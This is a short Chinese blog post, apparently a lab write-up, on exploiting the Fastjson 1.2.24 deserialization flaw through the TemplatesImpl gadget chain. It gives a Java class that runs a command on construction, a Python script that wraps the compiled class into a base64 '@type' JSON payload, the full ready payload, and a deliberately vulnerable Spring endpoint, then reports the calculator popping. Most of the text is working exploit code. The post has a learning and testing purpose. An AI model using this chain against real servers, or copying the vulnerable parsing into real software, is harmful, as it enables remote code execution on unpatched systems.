---
title: FastJson反序列漏洞之Templateslmpl
categories: CVE
abbrlink: 16a08d49
---



# Fastjson(1.2.24)反序列化漏洞利用链之TemplatesImpl（不出网漏洞利用）

## 1.编写命令执行java并将其编译为class文件



```java
package com.shiro.vuln.fastjson;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TemplatesImplcmd extends AbstractTranslet {
    public TemplatesImplcmd() throws Exception {
        Runtime.getRuntime().exec("calc");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
}

```

## 2.使用python或java语言将该java文件进行base64编码并结合poc

我这里使用python语言

```python
# -*- coding: utf-8 -*-
import base64

filename = input("filename:")
with open(filename, "rb") as fin:
    byte = fin.read()
    fout = base64.b64encode(byte).decode("utf-8")
    poc = '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}' % fout
    print(poc)
```

输出json

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAGwEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsY21kLmphdmEMAAcACAcAHAwAHQAeAQAEY2FsYwwAHwAgAQAoY29tL3NoaXJvL3Z1bG4vZmFzdGpzb24vVGVtcGxhdGVzSW1wbGNtZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4AAQAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAAA8AAQANAA8AAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAQAAEAEQAAAAIAEg=="],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

## 3.启动靶场

```java
    @PostMapping("/json")
    @ResponseBody
    public JSONObject parse(@RequestBody String data) {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("status", 0);
        System.out.println(data);
        JSON.parseObject(data, Feature.SupportNonPublicField);//Templateslmpl必须要NonPublicField支持
        return jsonObject;
    }
```

## 4.postman发送请求验证

![image-20230825093950088](C:\Users\ChenLei\Desktop\周报\0825第13周报-陈磊\image-20230825093950088.png)

成功弹出计算器验证 成功。
